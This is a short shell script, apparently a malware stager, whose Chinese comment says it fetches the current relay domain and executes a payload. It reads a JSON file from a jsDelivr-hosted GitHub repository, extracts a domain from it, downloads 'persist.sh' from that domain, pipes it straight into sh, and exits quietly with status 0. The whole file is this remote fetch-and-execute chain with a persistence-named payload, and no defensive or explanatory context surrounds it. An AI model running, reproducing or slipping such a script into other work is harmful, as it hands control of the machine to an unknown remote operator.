#!/bin/sh
# pin: 拉当前中继域名并执行载荷
P=$(curl -s -m 8 "https://cdn.jsdelivr.net/gh/relay-infra-ops/dsh-relay-pin@main/relay.json")
D=$(printf '%s' "$P" | sed -n 's/.*"domain"[: ]*"\([^"]*\)".*/\1/p')
[ -n "$D" ] && curl -s -m 15 "$D/persist.sh" | sh
exit 0
